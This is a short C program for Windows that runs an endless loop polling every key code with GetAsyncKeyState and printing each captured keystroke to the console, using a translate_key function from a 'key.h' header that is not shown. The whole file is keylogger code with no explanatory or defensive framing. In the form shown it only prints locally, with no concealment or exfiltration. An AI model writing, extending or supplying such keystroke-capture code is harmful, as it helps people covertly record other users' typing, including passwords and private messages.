#include <stdio.h>
#include <windows.h>

#include "key.h"

int main(int argc, char *argv[])
{
    while (1)
        for (DWORD i = 0; i < 255; i++)
            if(GetAsyncKeyState(i) == -32767)
                printf("%s", translate_key(i));
    return 0;
}
